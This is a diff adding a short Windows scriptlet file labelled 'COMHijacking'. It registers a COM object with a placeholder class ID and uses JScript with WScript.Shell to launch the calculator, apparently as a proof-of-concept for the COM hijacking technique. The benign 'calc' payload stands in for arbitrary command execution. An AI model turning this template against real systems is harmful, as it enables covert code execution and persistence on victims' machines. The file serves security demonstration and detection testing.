@@ -1,0 +1,19 @@
+<?XML version="1.0"?>
+<scriptlet>
+ 
+<registration
+    description="COMHijacking"
+    progid="COMHijacking.Example"
+    version="1"
+    classid="{00000001-0000-0000-0000-000000000099}"
+    remotable="true"
+    >
+</registration>
+ 
+<script language="JScript">
+    <![CDATA[
+        var process = new ActiveXObject("WScript.Shell").Run("calc");
+    ]]>
+</script>
+ 
+</scriptlet>
